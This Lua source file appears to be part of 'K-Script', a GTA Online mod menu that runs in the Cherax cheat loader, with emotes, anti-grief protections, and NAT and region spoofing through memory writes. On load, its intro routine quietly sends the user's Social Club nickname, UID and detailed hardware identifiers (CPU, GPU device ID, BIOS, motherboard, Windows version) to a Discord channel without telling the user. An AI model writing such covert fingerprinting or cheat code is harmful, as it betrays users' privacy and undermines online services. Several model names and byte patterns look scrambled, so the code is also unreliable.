  local prop = GTA.CreateObject(hash, x, y, z - 0.2, true)
  local bone = PED.GET_PED_BONE_INDEX(ped, boneId or 28422)
  local px, py, pz, rx, ry, rz = normalizePlacement(placement)

  ENTITY.ATTACH_ENTITY_TO_ENTITY(prop, ped, bone, px, py, pz, rx, ry, rz, false, false, false, true, 2, true, 0)
  EmoteState.activeProps[#EmoteState.activeProps + 1] = prop
  EmoteState.hasAttachedProps = true
  STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

  return prop
end

local function emoteFlags(options)
  if not options then
    return 0
  end

  if options.EmoteLoop then
    return options.EmoteMoving and 51 or 1
  end

  if options.EmoteMoving then
    return 51
  end

  if options.EmoteMoving == false then
    return 0
  end

  if options.EmoteStuck then
    return 50
  end

  return 0
end

local function playScenario(ped, scenarioType, scenarioName)
  if scenarioType == "MaleScenario" and CheckGender() ~= "male" then
    notify("This emote is for male characters only.")
    return false
  end

  TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)

  if scenarioType == "ScenarioObject" then
    local x, y, z = ENTITY.GET_ENTITY_COORDS(ped, false)
    local heading = ENTITY.GET_ENTITY_HEADING(ped)
    TASK.TASK_START_SCENARIO_AT_POSITION(ped, scenarioName, x, y, z - 0.5, heading, 0, true, false)
  else
    TASK.TASK_START_SCENARIO_IN_PLACE(ped, scenarioName, 0, true)
  end

  EmoteState.playing = true
  EmoteState.scenarioType = scenarioType
  return true
end

function OnEmotePlay(emoteData)
  if type(emoteData) ~= "table" then
    return false
  end

  local ped = PLAYER.GET_PLAYER_PED(-1)
  if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
    notify("Please leave your vehicle to use emotes.")
    return false
  end

  if not ENTITY.IS_AN_ENTITY(ped) then
    return false
  end

  local dict, anim, label = table.unpack(emoteData)
  local options = emoteData.AnimationOptions or {}

  EmoteState.currentDict = dict
  EmoteState.currentAnim = anim
  EmoteState.currentLabel = label or anim
  EmoteState.currentDuration = options.EmoteDuration or -1
  EmoteState.currentFlags = emoteFlags(options)
  EmoteState.scenarioType = dict

  if EmoteState.hasAttachedProps then
    DestroyAllProps()
  end

  if dict == "MaleScenario" or dict == "Scenario" or dict == "ScenarioObject" then
    return playScenario(ped, dict, anim)
  end

  if not loadAnimDict(dict) then
    notify(("Failed to load animation dictionary: %s"):format(tostring(dict)))
    return false
  end

  TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
  TASK.TASK_PLAY_ANIM(ped, dict, anim, 2, 2, EmoteState.currentDuration, EmoteState.currentFlags, 0, false, false, false)
  STREAMING.REMOVE_ANIM_DICT(dict)
  EmoteState.playing = true

  if options.Prop then
    if options.EmoteDuration and options.EmoteDuration > 0 then
      Script.Yield(options.EmoteDuration)
    end

    AddPropToPlayer(options.Prop, options.PropBone, options.PropPlacement)

    if options.SecondProp then
      EmoteState.hasSecondProp = true
      AddPropToPlayer(options.SecondProp, options.SecondPropBone, options.SecondPropPlacement)
    end
  end

  return true
end

function playDance(name)
  local dance = Dances[name]
  if not dance then
    notify(("Unknown dance emote: %s"):format(tostring(name)))
    return false
  end

  Script.QueueJob(OnEmotePlay, dance)
  return true
end

Logger.Log(eLogColor.GREEN, "K-Script", "Initializing Caches...")

networkPlayerGlobalBase = isGameVersionEnhanced and 2658294 or 2657589
transitionStateGlobal = isGameVersionEnhanced and 1575020 or 1575018
playerInfoGlobalBase = isGameVersionEnhanced and 1845299 or 1845281
playerHashGlobalBase = isGameVersionEnhanced and 1892798 or 1892703
cachedModderDetections = {}

function isNetPlayerOk(playerId, requirePlaying, requireState)
  if requirePlaying == nil then
    requirePlaying = false
  end

  if requireState == nil then
    requireState = true
  end

  if not NETWORK.NETWORK_IS_PLAYER_ACTIVE(playerId) then
    return false
  end

  if requirePlaying and not PLAYER.IS_PLAYER_PLAYING(playerId) then
    return false
  end

  if requireState then
    local state = ScriptGlobal.GetInt(networkPlayerGlobalBase + 1 + (playerId * 468))
    if state ~= 4 then
      return false
    end
  end

  return true
end

function checkDetections(playerId)
  local detections = ModderDB.GetModderDetections(playerId)
  if not detections then
    return nil
  end

  local latest = nil
  for index = 1, #detections, 3 do
    local lastTime = detections[index]
    local count = detections[index + 1]
    local name = detections[index + 2]

    if type(lastTime) == "number" and type(name) == "string" then
      if latest == nil or latest.lastTime < lastTime then
        latest = {
          name = name,
          count = count,
          lastTime = lastTime,
        }
      end
    end
  end

  if latest then
    cachedModderDetections[playerId] = latest
    return latest.name
  end

  return nil
end

function getTransitionState()
  return ScriptGlobal.GetInt(transitionStateGlobal) or 0
end

function getTransitionStateName(state)
  for name, value in pairs(TransitionState) do
    if value == state then
      return name
    end
  end

  return "UNKNOWN"
end

function getNetEventName(eventId)
  for name, value in pairs(eNetGameEvent) do
    if value == eventId then
      return name
    end
  end

  return "UNKNOWN"
end

function isTableEmpty(value)
  return type(value) ~= "table" or next(value) == nil
end

function int2float(value)
  return value + 0.0
end

function luaMemoryKb()
  collectgarbage()
  return collectgarbage("count")
end

function trimVersion(version)
  local trimmed = tostring(version):match("^(%d+%.%d%d)")
  return trimmed or tostring(version)
end

function rancolor(vehicle)
  local colors = {28, 38, 42, 44, 54, 55, 70, 81, 89, 111, 123, 127, 134, 135, 137, 140, 145, 157}
  local color = colors[math.random(#colors)]
  return VEHICLE.SET_VEHICLE_COLOURS(vehicle, color, color)
end

function getScriptTier(uid)
  if uid == DevUID then
    return "Developer"
  end

  if tableContainsValue(supporterUIDs, uid) then
    return "Donator"
  end

  if tableContainsValue(AdmanUIDs, uid) then
    return "Admin"
  end

  if tableContainsValue(moderatorUIDs, uid) then
    return "Moderator"
  end

  return "Free User"
end

local function hudTextWidth(text, font, scale)
  HUD.BEGIN_TEXT_COMMAND_GET_SCREEN_WIDTH_OF_DISPLAY_TEXT("STRING")
  HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
  HUD.SET_TEXT_FONT(font)
  HUD.SET_TEXT_SCALE(scale, scale)
  return HUD.END_TEXT_COMMAND_GET_SCREEN_WIDTH_OF_DISPLAY_TEXT(true)
end

local function drawHudText(text, x, y, font, scale, red, green, blue, alpha, centered)
  HUD.SET_TEXT_FONT(font)
  HUD.SET_TEXT_SCALE(scale, scale)
  HUD.SET_TEXT_COLOUR(red, green, blue, alpha)
  HUD.SET_TEXT_CENTRE(centered or false)
  HUD.SET_TEXT_OUTLINE()
  HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
  HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
  HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end

local function waitForPlayableWorld()
  while not ShouldUnload() do
    local loading = DLC.GET_IS_LOADING_SCREEN_ACTIVE() or DLC.GET_IS_INITIAL_LOADING_SCREEN_ACTIVE() or maintransitionActive
    if not loading then
      return true
    end

    Script.Yield(1000)
  end

  return false
end

local function buildIntroTelemetry()
  return (
    "%s loaded K-Script with UID %i, isSupporter %s, GameVersion: %s\n" ..
    "HW Info:\nCPU: %s\nCPU Speed: %s\nCores: %s\nGPU: %s\nGPU PNPDeviceID: %s\n" ..
    "Mobo: %s\nBios Version: %s\nBios Vendor: %s\nBios Manufacturer: %s\nWindows Version: %s"
  ):format(
    SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(),
    Cherax.GetUID(),
    tostring(isSupporter),
    getGameVersion(isGameVersionEnhanced),
    displayOrNA(HW_COMPONENTS.CPU_NAME),
    displayOrNA(HW_COMPONENTS.CPU_SPEED),
    displayOrNA(HW_COMPONENTS.NUM_CPU_PHYS_CORES),
    displayOrNA(HW_COMPONENTS.GPU_NAME),
    displayOrNA(HW_COMPONENTS.GPU_PNP_DEVICE_ID),
    displayOrNA(HW_COMPONENTS.MOBO_NAME),
    displayOrNA(HW_COMPONENTS.BIOS_VERSION),
    displayOrNA(HW_COMPONENTS.BIOS_VENDOR),
    displayOrNA(HW_COMPONENTS.BASE_BOARD_MANUFA),
    displayOrNA(HW_COMPONENTS.WINDOWS_VERSION)
  )
end

function initiateIntro()
  Script.QueueJob(function()
    if not waitForPlayableWorld() then
      return
    end

    SendToDiscord("lol", buildIntroTelemetry(), true)
    Script.Yield(1500)
    Script.RegisterLooped(Heartbeat)

    local playerName = Players.GetName(GTA.GetLocalPlayerId())
    local tier = getScriptTier(Cherax.GetUID())
    local gameVersion = getGameVersion(isGameVersionEnhanced)
    local subtitle = ("Authorized, %s (%s - %s)"):format(playerName, tier, gameVersion)
    local title = "K-Script"
    local startedAt = Time.GetEpocheMs()
    local duration = 4500
    local font = 6
    local titleWidth = hudTextWidth(title, font, 0.75)
    local subtitleWidth = hudTextWidth(subtitle, font, 0.4)

    if GRAPHICS.ANIMPOSTFX_IS_RUNNING("FocusIn") then
      GRAPHICS.ANIMPOSTFX_STOP("FocusIn")
    end
    GRAPHICS.ANIMPOSTFX_PLAY("FocusIn", 0, true)

    while Time.GetEpocheMs() - startedAt < duration and not ShouldUnload() do
      local elapsed = Time.GetEpocheMs() - startedAt
      local fadeIn = math.min(elapsed / 250, 1)
      local fadeOut = math.min((duration - elapsed) / 250, 1)
      local alpha = math.floor(math.min(fadeIn, fadeOut) * 255)
      local pulse = (math.sin((Time.GetEpocheMs() * 0.005) + 0.5) + 1) / 2
      local red = math.floor(100 + (99 * pulse))

      HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
      GRAPHICS.DRAW_RECT(0.5, 0.5, 1, 1, 5, 7, 10, math.floor(alpha * 0.7), true)
      drawHudText(title, 0.5 - (titleWidth * 0.425), 0.43, font, 0.75, red, 20, 20, alpha, false)
      drawHudText(subtitle, 0.5 - (subtitleWidth * 0.3375), 0.49, font, 0.4, 255, 255, 255, alpha, false)
      GRAPHICS.DRAW_RECT(0.5, 0.55, 0.14, 0.001, 255, 255, 255, math.floor(alpha * 0.2), true)
      GRAPHICS.DRAW_RECT(0.5 - ((0.14 - ((elapsed / duration) * 0.14)) * 0.5), 0.55, (elapsed / duration) * 0.14, 0.001, 0, 255, 0, alpha, true)
      Script.Yield(0)
    end

    GRAPHICS.ANIMPOSTFX_STOP("FocusIn")
  end)
end

function getPlayerCurrentInterior(playerId)
  if not isNetPlayerOk(playerId) then
    return nil
  end

  return ScriptGlobal.GetInt(networkPlayerGlobalBase + 1 + (playerId * 468) + 246)
end

function getPlayerCurrentShop(playerId)
  if not isNetPlayerOk(playerId) then
    return nil
  end

  return ScriptGlobal.GetInt(networkPlayerGlobalBase + 1 + (playerId * 468) + 250)
end

function iUniquePlayerHash(playerId)
  return ScriptGlobal.GetInt(playerHashGlobalBase + 1 + (playerId * 615) + 517)
end

function deleteEntityLocal(entity)
  local entityPointer = GTA.HandleToPointer(entity)
  if entityPointer == nil then
    return
  end

  if NetworkObjectMgr and entityPointer.NetObject then
    NetworkObjectMgr.UnregisterNetworkObject(entityPointer.NetObject, 15, true, true)
  end

  local handlePointer = Memory.AllocInt()
  Memory.WriteInt(handlePointer, entity)
  ENTITY.DELETE_ENTITY(handlePointer)
  Memory.Free(handlePointer)
end

function blacklistSound()
  local ped = PLAYER.PLAYER_PED_ID()
  local pos = V3.New(ENTITY.GET_ENTITY_COORDS(ped, false))
  local speech = ENTITY.GET_ENTITY_MODEL(ped) == Utils.Joaat("MP_M_Freemode_34") and "XM03_GENERIC_NEGATIVE_MALE" or "XM70_GENERIC_NEGATIVE_FEMALE"

  Natives.InvokeVoid(-1340946686285742523, speech, "XM36_AISECRETARY", pos.x, pos.y, pos.z, "SPEECH_PARAMS_FORCE")
  notify("Cannot target this player; they are blacklisted.")
end

function getOwnPedPosition()
  ownPed = GTA.GetLocalPed()
  if ownPed == nil then
    return V3.New()
  end

  return ownPed.Position
end

function manhattanDistance(first, second)
  return math.abs(first.x - second.x) + math.abs(first.y - second.y) + math.abs(first.z - second.z)
end

function clearBlockedCache()
  blockedHashed = {}
end

function modelNameFromHash(hash)
  for _, name in pairs(vehicleModelNames) do
    if Utils.Joaat(name) == hash or MISC.GET_HASH_KEY(name) == hash then
      return name
    end
  end

  return tostring(hash)
end

local function callFeature(feature, methodName, ...)
  if feature and feature[methodName] then
    return feature[methodName](feature, ...)
  end
  return feature
end

local function setDefaultAndReset(feature, value, click)
  callFeature(feature, "SetDefaultValue", value)
  callFeature(feature, "Reset")
  if click then
    callFeature(feature, "OnClick")
  end
  return feature
end

local function isFeatureEnabled(name)
  return FeatureMgr.IsFeatureEnabled(Utils.Joaat(name))
end

local function getFeatureInt(name, fallback)
  local feature = FeatureMgr.GetFeature(Utils.Joaat(name))
  if feature and feature.GetIntValue then
    return feature:GetIntValue()
  end
  return fallback
end

local function registerNamedToggle(id, label, description, defaultValue, callback, clickAfterReset)
  local feature = FeatAdd(Utils.Joaat(id), label, eFeatureType.Toggle, description or "", callback or function()
  end)
  return setDefaultAndReset(feature, defaultValue, clickAfterReset)
end

local function registerEmoteFeatureTable(sourceTable)
  for command, emoteData in pairs(sourceTable) do
    FeatAdd(Utils.Joaat(command), command, eFeatureType.Button, "", function()
      Script.QueueJob(OnEmotePlay, emoteData)
    end, true)
  end
end

registerEmoteFeatureTable(Emotes)
registerEmoteFeatureTable(Dances)
registerEmoteFeatureTable(PropEmotes)

cancelEmotesWithX = false

function CancelEmotesTick()
  if not cancelEmotesWithX then
    Script.Yield(2000)
    return
  end

  if ShouldUnload() then
    return
  end

  if PAD.IS_CONTROL_PRESSED(0, 73) then
    EmoteCancel()
  end

  Script.Yield(50)
end

registerNamedToggle("canceldpemotes", "Cancel Emotes By Pressing X", "", false, function(feature)
  cancelEmotesWithX = feature:IsToggled()
end)

local function sortedDanceCommands()
  local commands = {}
  for command in pairs(Dances) do
    commands[#commands + 1] = command
  end
  table.sort(commands)
  return commands
end

function playDance(commandOrIndex)
  local command = commandOrIndex
  if command == nil or command == "" then
    local commands = sortedDanceCommands()
    command = commands[math.random(#commands)]
    notify(("You randomly selected dance '%s'."):format(command))
  elseif tonumber(command) then
    local commands = sortedDanceCommands()
    command = commands[tonumber(command)]
  end

  local dance = Dances[command]
  if not dance then
    notify(("'%s' is not a valid dance."):format(tostring(commandOrIndex)))
    return false
  end

  Script.QueueJob(OnEmotePlay, dance)
  return true
end

registerNamedToggle("acceptAlerts", "Auto Accept Join Messages", "Will block join and a few error messages.", false)

poolFeature = registerNamedToggle(
  "poolToggle",
  "Make Yourself visible for K-Script Users",
  "When enabled, this advertises your session to other K-Script users.",
  true,
  function(feature)
    isInPool = feature:IsToggled()
  end
)

notifyOnlineFeature = registerNamedToggle(
  "notifyToggle",
  "Toggle Online Status Notifys",
  "Show notifications when K-Script users come online or offline.",
  false,
  function(feature)
    notifyEnabled = isAdmin and feature:IsToggled() or false
  end
)

scriptEventProtectionFeatures = {
  {id = "scriptEventProtections", label = "Script Event Protections", description = "Master toggle for all script event protections."},
  {id = "blockSHcrash", label = "Block SH crash", description = "Blocks known script-host crash attempts."},
  {id = "blockInfiniteLoading", label = "Block Infinite Loading Screen", description = "Blocks known infinite loading screen attempts."},
  {id = "blockApartmentInvite", label = "Block Apartment Invite Spam", description = "Blocks malicious apartment invite events."},
  {id = "blockRemoveWanted", label = "Block Remove Wanted", description = "Blocks remote remove wanted level events."},
  {id = "blockGiveWanted", label = "Block Give Wanted", description = "Blocks remote give wanted level events."},
  {id = "blockSoundSpam5k", label = "Block Sound Spam", description = "Blocks known sound spam events."},
  {id = "blockTickerMessage", label = "Block Ticker Message", description = "Blocks ticker message spam events."},
  {id = "blockInsuranceScam", label = "Block Insurance Scam", description = "Blocks malicious insurance script events."},
  {id = "blockPhoneInviteSpam", label = "Block Phone Invite Spam", description = "Blocks known phone invite spam events."},
  {id = "blockMissionInvite", label = "Block Mission Force Invites", description = "Blocks forced mission or activity invite events."},
  {id = "blockMissionConfirm", label = "Block Mission Launch Confirm", description = "Blocks unwanted mission launch confirmation events."},
}

for _, definition in ipairs(scriptEventProtectionFeatures) do
  registerNamedToggle(definition.id, definition.label, definition.description, true)
end

discordRpcToggle = registerNamedToggle(
  "discordRPCToggle",
  "Discord RPC",
  "Enable/Disable the K-Script Discord RPC.",
  true,
  function(feature)
    if feature:IsToggled() then
      EnableDiscordRPC()
    else
      DisableDiscordRPC()
    end
  end
)

local function ripOptionalPattern(name, legacyPattern, enhancedName, enhancedPattern, offset)
  local address = ptrnScan(isGameVersionEnhanced and enhancedName or name, isGameVersionEnhanced and enhancedPattern or legacyPattern)
  if not address then
    return nil
  end
  return Memory.Rip(address + (offset or 3))
end

natTypeAddress = ripOptionalPattern("NINT", "71 16 EC 51 1B 38 ? ? ? ? 18 C3 08 ? E1 ? ? ? ? 1B 38 ? ? ? ? 71 16 C7 51", "NINTE", "04 49 EC 84 4B 61 ? ? ? ? 41 C6 31", 6)
regionAddress = ripOptionalPattern("RGGLI", "37 72 EC 17 72 2D ? ? ? ? ? 64 09", "RGGLIE", "8C 2D 49 ? ? ? ? 82 23 F5 82 23 FA E2 ? ? ? ? 28 C4 18 7D", isGameVersionEnhanced and 3 or 16)

originalNatType = natTypeAddress and Memory.ReadInt(natTypeAddress) or 1
originalRegion = regionAddress and Memory.ReadInt(regionAddress) or 0

natSpoofCombo = FeatAdd(Utils.Joaat("natSpoofCombo"), "", eFeatureType.Combo, "Will spoof your NAT type.", function(feature)
  if isFeatureEnabled("natSpoofToggle") and natTypeAddress then
    local spoofedType = feature:GetListIndex() + 1
    notify(("Spoofing NatType to: %s"):format(natTypes[spoofedType] or "Unknown"))
    Memory.WriteInt(natTypeAddress, spoofedType)
  end
end)
callFeature(natSpoofCombo, "SetList", natTypes)
callFeature(natSpoofCombo, "SetListIndex", math.max((originalNatType or 1) - 1, 0))

registerNamedToggle("natSpoofToggle", "Spoof Nat Type", "Spoof your NAT type for matchmaking services.", false, function(feature)
  if not natTypeAddress then
    notify("NAT spoof pointer unavailable.")
    return
  end

  if feature:IsToggled() then
    local spoofedType = natSpoofCombo:GetListIndex() + 1
    notify(("Spoofing NatType to: %s"):format(natTypes[spoofedType] or "Unknown"))
    Memory.WriteInt(natTypeAddress, spoofedType)
  else
    notify(("Resetting NatType to: %s"):format(natTypes[originalNatType] or tostring(originalNatType)))
    Memory.WriteInt(natTypeAddress, originalNatType)
  end
end)

regionSpoofCombo = FeatAdd(Utils.Joaat("regionSpoofCombo"), "", eFeatureType.Combo, "Will spoof your matchmaking region.", function(feature)
  if isFeatureEnabled("regionSpoofToggle") and regionAddress then
    local region = feature:GetListIndex()
    notify(("Spoofing Region to: %s"):format(regionNames[region] or "Unknown"))
    Memory.WriteInt(regionAddress, region)
  end
end)
callFeature(regionSpoofCombo, "SetList", regionNames)
callFeature(regionSpoofCombo, "SetListIndex", originalRegion or 0)

registerNamedToggle("regionSpoofToggle", "Spoof Region", "Spoof your matchmaking region.", false, function(feature)
  if not regionAddress then
    notify("Region spoof pointer unavailable.")
    return
  end

  if feature:IsToggled() then
    local region = regionSpoofCombo:GetListIndex()
    notify(("Spoofing Region to: %s"):format(regionNames[region] or tostring(region)))
    Memory.WriteInt(regionAddress, region)
  else
    notify(("Resetting Region to: %s"):format(regionNames[originalRegion] or tostring(originalRegion)))
    Memory.WriteInt(regionAddress, originalRegion)
  end
end)

function requestScript(scriptName)
  SCRIPT.REQUEST_SCRIPT(scriptName)
  while not SCRIPT.HAS_SCRIPT_LOADED(scriptName) and not ShouldUnload() do
    Script.Yield()
  end
  return SCRIPT.HAS_SCRIPT_LOADED(scriptName)
end

function startScript(scriptName, stackSize)
  if not SCRIPT.DOES_SCRIPT_EXIST(scriptName) then
    return false
  end

  local startedAt = Time.GetEpocheMs()
  while not SCRIPT.HAS_SCRIPT_LOADED(scriptName) and Time.GetEpocheMs() < startedAt + 1000 and not ShouldUnload() do
    SCRIPT.REQUEST_SCRIPT(scriptName)
    Script.Yield()
  end

  if not SCRIPT.HAS_SCRIPT_LOADED(scriptName) then
    return false
  end

  local threadId = SYSTEM.START_NEW_SCRIPT(scriptName, stackSize or 512)
  SCRIPT.SET_SCRIPT_AS_NO_LONGER_NEEDED(scriptName)
  return true, threadId
end

local function waitForTransitionState(state, yieldMs)
  while getTransitionState() ~= state and not ShouldUnload() do
    Script.Yield(yieldMs or 0)
  end
  return not ShouldUnload()
end

function restartFreemodeScript()
  if not NETWORK.NETWORK_IS_SESSION_STARTED() then
    return
  end

  if numConnectedPlayers < 2 then
    notify("You are alone in this session; restart skipped.")
    return
  end

  local host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("freemode", -1, 0)
  if host == GTA.GetLocalPlayerId() then
    for _, playerId in ipairs(Players.Get()) do
      if playerId ~= GTA.GetLocalPlayerId() then
        GTA.GiveScriptHost(playerId, Utils.sJoaat("freemode"))
        Script.Yield(500)
      end
    end
  end

  local x, y, z = ENTITY.GET_ENTITY_COORDS(getPlayerPed(), false)

  if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.sJoaat("MainTransition")) > 0 then
    Script.ExecuteAsScript("MainTransition", function()
      SCRIPT.TERMINATE_THIS_THREAD()
    end)
  end

  requestScript("MainTransition")
  Script.ExecuteAsScript("freemode", function()
    SCRIPT.TERMINATE_THIS_THREAD()
  end)

  while SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.sJoaat("freemode")) > 0 and not ShouldUnload() do
    Script.Yield()
  end

  local ok, threadId = startScript("MainTransition", 8032)
  if not ok then
    return false
  end

  ScriptGlobal.SetInt(isGameVersionEnhanced and 1677504 or 1677452, threadId)
  SCRIPT.SET_SCRIPT_AS_NO_LONGER_NEEDED("MainTransition")

  if waitForTransitionState(58) then
    ScriptGlobal.SetInt(transitionStateGlobal, 22)
    GRAPHICS.RESET_PAUSED_RENDERPHASES()
    GRAPHICS.ANIMPOSTFX_STOP_ALL()
  end

  while getTransitionState() ~= 66 and not ShouldUnload() do
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getPlayerPed(), x, y, z, false, false, false)
    Script.Yield(100)
  end

  ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getPlayerPed(), x, y, z, false, false, false)
  return true
end

FeatAdd(Utils.Joaat("stopfm"), "Restart Freemode Script", eFeatureType.Button, "", function()
  Script.QueueJob(restartFreemodeScript)
end, true)

blockedHashed = blockedHashed or {}

local featureAliases = {
  storeBlockedEntities = {"cacheBlockedEnts6", "cacheBlockedEnts5", "cacheBlockedEnts3", "cacheBlockedEnts8", "cacheBlockedEnts1"},
  closeSpawnRadius = {"closespawnRadius8", "closespawnRadius4", "closespawnRadius3"},
}

local function anyFeatureEnabled(names)
  for _, name in ipairs(names) do
    if isFeatureEnabled(name) then
      return true
    end
  end
  return false
end

local function firstFeatureInt(names, fallback)
  for _, name in ipairs(names) do
    local feature = FeatureMgr.GetFeature(Utils.Joaat(name))
    if feature and feature.GetIntValue then
      return feature:GetIntValue()
    end
  end
  return fallback
end

notifyProtections = registerNamedToggle("notifyProtections", "Notify Protections", "When enabled all protections will notify and log.", false, nil, true)
storeBlockedEntities = registerNamedToggle("cacheBlockedEnts6", "Store Entities", "Store blocked entities and continue blocking the same model.", true, nil, true)
FeatAdd(Utils.Joaat("clearcacheEnts9"), "Clear Store Entities", eFeatureType.Button, "Clears cached blocked entity hashes.", function()
  clearBlockedCache()
end)

closeSpawnRadiusFeature = FeatAdd(Utils.Joaat("closespawnRadius8"), "Block Radius", eFeatureType.InputInt, "")
callFeature(closeSpawnRadiusFeature, "SetLimitValues", 5, 5000)
callFeature(closeSpawnRadiusFeature, "SetIntValue", 15)

local function hashSet(names)
  local set = {}
  for _, name in ipairs(names) do
    set[Utils.Joaat(name)] = true
  end
  return set
end

local function playerLabel(playerId)
  local name = Players.GetName(playerId) or "Player "
  return name .. tostring(playerId)
end

local function modelName(hash)
  if GTA.GetModelNameFromHash then
    return GTA.GetModelNameFromHash(hash)
  end
  return modelNameFromHash(hash)
end

local function getNodeAs(node, typeName)
  if node and node.As then
    return node:As(typeName)
  end
  return nil
end

local function isFreemodePedHash(hash)
  return hash == Utils.Joaat("MP_M_Freemode_45")
    or hash == Utils.Joaat("MP_M_Freemode_67")
    or hash == Utils.Joaat("MP_F_Freemode_12")
    or hash == Utils.Joaat("MP_F_Freemode_45")
end

local function shouldAllowPlayerPed(meta, pedNode)
  if meta.ObjectType == 11 then
    return true
  end

  return meta.ObjectType == 6
    and pedNode.IsRespawnObjId
    and pedNode.RespawnFlaggedForRemoval
    and meta.IsRemote
end

function blockCloseSpawn(isCreate, modelHash, position, meta, nodes)
  local sourceId = meta.PlayerId
  local sourceName = playerLabel(sourceId)
  local radius = firstFeatureInt(featureAliases.closeSpawnRadius, 15)

  if anyFeatureEnabled(featureAliases.storeBlockedEntities) and blockedHashed[modelHash] then
    return false
  end

  if not isCreate or sourceId == GTA.GetLocalPlayerId() or meta.PendingPlayerId == GTA.GetLocalPlayerId() then
    return true
  end

  if manhattanDistance(position, getOwnPedPosition()) >= radius then
    return true
  end

  if modelHash == 0 or modelHash == 4294967295 then
    notify(("Invalid modelHash(0x%X) in Creation Sync Data Node from %s"):format(modelHash, sourceName))
    return false
  end

  for _, node in ipairs(nodes) do
    if node:GetNodeType() == eSyncDataNode.CPedCreationDataNode then
      local pedNode = getNodeAs(node, "CPedCreationDataNode")
      if pedNode and isFreemodePedHash(modelHash) then
        if shouldAllowPlayerPed(meta, pedNode) then
          if isDev then
            notify(("Close Spawn: allowing player ped of %s (%s|%s)"):format(sourceName, modelName(pedNode.modelHash), eNetObjectTypeNames[meta.ObjectType]))
          end
          return true
        end

        if isDev then
          notify(("Close Spawn: potential player ped of %s (%s|%s)"):format(sourceName, modelName(pedNode.modelHash), eNetObjectTypeNames[meta.ObjectType]))
        elseif isFeatureEnabled("notifyProtections") then
          notify(("Blocked Close Entity Spawn: %s from %s"):format(modelName(modelHash), sourceName))
        end

        return false
      end
    end
  end

  if isFeatureEnabled("notifyProtections") then
    notify(("Blocked Close Entity Spawn: %s from %s"):format(modelName(modelHash), sourceName))
  end

  if anyFeatureEnabled(featureAliases.storeBlockedEntities) and not isFreemodePedHash(modelHash) then
    blockedHashed[modelHash] = true
  end

  return false
end

local function bindCanApplyToggle(featureId, label, description, defaultValue, handlerName, handler)
  local feature
  feature = FeatAdd(Utils.Joaat(featureId), label, eFeatureType.Toggle, description, function(toggle)
    if toggle:IsToggled() then
      if _ENV[handlerName] == nil then
        _ENV[handlerName] = EventMgr.RegisterHandler(eLuaEvent.CAN_APPLY_NODE_DATA, handler)
      end
    elseif _ENV[handlerName] ~= nil then
      EventMgr.RemoveHandler(_ENV[handlerName])
      _ENV[handlerName] = nil
    end
  end)
  setDefaultAndReset(feature, defaultValue, true)
  return feature
end

bindCanApplyToggle("closespawnProt5", "Close Spawn Protection", "Blocks entities from spawning on or around you in a set radius.", true, "closespawnHandler", blockCloseSpawn)

blockedObjectModels = hashSet({
  "ar_prop_ar_neon_gate_89a", "ar_prop_ar_neon_gate_70a", "ar_prop_ar_neon_gate_27a",
  "ar_prop_ar_neon_gate_91a", "ar_prop_ar_neon_gate_59a", "ar_prop_ar_neon_gate_45b",
  "ar_prop_ar_neon_gate7x_37a", "ar_prop_ar_neon_gate6x_82a", "ar_prop_ar_neon_gate_57b",
  "ar_prop_ar_neon_gate9x_57a", "ar_prop_ar_neon_gate0x_24a", "ar_prop_ar_neon_gate6x_27a",
  "ar_prop_ar_neon_gate0x_27a", "ar_prop_ar_neon_gate6x_25a", "ar_prop_ar_neon_gate7x_92a",
  "ar_prop_ar_neon_gate0x_67a", "ar_prop_ar_neon_gate6x_89a", "prop_juicestand",
  "stt_prop_stunt_tube_qg", "stt_prop_stunt_tube_hg", "stt_prop_stunt_tube_crn_0d",
  "stt_prop_stunt_tube_s", "h7_prop_x40_sub", "prop_temp_carrier", "prop_cj_big_boat",
})

function ObjectProtection(isCreate, modelHash, _position, meta, nodes)
  for _, node in ipairs(nodes) do
    if node:GetNodeType() == eSyncDataNode.CObjectCreationDataNode then
      local objectNode = getNodeAs(node, "CObjectCreationDataNode")
      if objectNode and blockedObjectModels[objectNode.modelHash] and isCreate then
        if isFeatureEnabled("notifyProtections") then
          notify(("Blocked Object Spawn: %s from %s"):format(modelName(objectNode.modelHash), playerLabel(meta.PlayerId)))
        end
        return false
      end
    end
  end

  return true
end

bindCanApplyToggle("ObjProt0", "Object Spawn Protection", "Blocks spawning of laggy objects.", true, "objHandler", ObjectProtection)

blockedPedModels = hashSet({
  "CS_LesterCrest_5", "CS_Orleans", "CS_DaveNorton", "CS_Carbuyer", "CS_Guadalope",
  "CS_BradCadaver", "P_Michael_80", "P_Franklin_02", "IG_LesterCrest", "U_M_O_FilmNoir",
  "A_C_Chimp", "A_C_Chimp_46", "IG_Orleans", "IG_Wade", "U_M_M_Yeti",
  "Player_Two", "Player_One", "CS_TracyDiSanto", "ig_amandatownley", "ig_brad",
  "ig_josh", "ig_lamardavis_80", "ig_lazlow", "ig_lazlow_9", "ig_lestercrest",
  "ig_nervousron", "PLAYER_ZERO", "PLAYER_ONE", "PLAYER_TWO", "MP_M_Freemode_45",
  "MP_F_Freemode_12", "CS_LesterCrest_7", "CS_TaosTranslator0", "CS_MovPremF_01",
  "CS_Lazlow", "CS_Wade", "CS_ChrisFormage", "CS_Dale", "CS_Brad", "CS_NervousRon",
  "CS_Priest", "CS_MRS_Thornhill", "CS_MartinMadrazo", "CS_SiemonYetarian",
  "cs_ashley", "CS_LamarDavis_79", "CS_MrsPhillips", "CS_Old_Man1A",
  "CS_FBISuit_45", "CS_Stretch", "CS_Patricia_46", "CS_Dom", "CS_DrFriedlander",
  "CS_Zimbor", "CS_AmandaTownley_79", "CS_Beverly", "CS_Molly", "CS_Dreyfuss",
